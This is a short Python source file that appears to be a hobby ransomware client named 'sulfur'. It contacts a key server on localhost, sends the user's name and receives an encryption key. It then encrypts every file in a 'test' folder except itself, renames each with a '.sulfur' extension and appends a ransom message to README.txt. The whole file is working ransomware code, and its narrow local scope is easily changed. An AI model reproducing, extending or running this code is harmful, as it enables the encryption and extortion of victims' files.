import os
import socket
import base64
from cryptography.fernet import Fernet

HOST = '127.0.0.1'
PORT = 12345

ransomeMSG ="your data has been infected whit sulfur \nsomething stinks in here \ncontact livius09 if you want your files back its free (:"

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((HOST, PORT))

user=os.environ.get('USER', os.environ.get('USERNAME'))

client_socket.sendall(user.encode())

dat=client_socket.recv(64).decode()

hash=bytes.fromhex(dat)
fernet = Fernet(base64.urlsafe_b64encode(hash))

def encript(file):
    # Read and encrypt the file
    with open(file, "rb") as orfile:
        original = orfile.read()

    encrypted = fernet.encrypt(original)

    

    newname= file + ".sulfur"
    os.rename(file,newname)

    # Write the encrypted data
    with open(newname, "wb") as encrypted_file:
        encrypted_file.write(encrypted)



dir="test"

for root, dirs, files in os.walk(dir):
    for file in files:
        if(file!="client.py"):
            full_path = os.path.join(root, file)
            encript(full_path)

with open(dir+"/README.txt", "a") as file:
    file.write(ransomeMSG)